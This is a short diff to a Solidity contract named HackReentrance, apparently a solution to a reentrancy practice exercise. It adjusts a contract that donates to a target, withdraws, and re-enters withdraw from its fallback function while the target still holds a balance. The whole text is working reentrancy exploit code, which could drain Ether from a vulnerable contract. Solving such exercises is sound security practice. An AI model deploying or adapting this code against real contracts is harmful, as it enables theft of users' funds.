@@ -15,12 +15,12 @@ contract HackReentrance {
   }
 
   function becomeDonor() public {
-    reentranceAddress.donate.value(amountToWithdraw).gas(4000000)(address(this));
+    reentranceAddress.donate.value(amountToWithdraw)(address(this));
     reentranceAddress.withdraw(amountToWithdraw);
   }
 
   fallback() external payable {
-    if(address(reentranceAddress).balance >= 0){
+    if(address(reentranceAddress).balance != 0){
       reentranceAddress.withdraw(amountToWithdraw);
     }
   }
